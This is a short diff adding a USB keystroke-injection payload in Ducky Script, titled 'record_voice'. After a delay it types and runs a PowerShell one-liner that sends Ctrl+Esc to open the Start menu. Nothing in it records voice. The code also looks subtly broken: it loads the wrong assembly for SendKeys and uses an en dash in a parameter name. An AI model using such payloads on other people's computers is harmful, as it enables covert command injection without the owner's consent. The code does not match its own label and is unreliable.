@@ -1,0 +1,4 @@
+REM Payload: record_voice
+DELAY 500
+STRING powershell -c "Add-Type –AssemblyName presentationCore;[System.Windows.Forms.SendKeys]::SendWait('^{ESC}')"
+ENTER
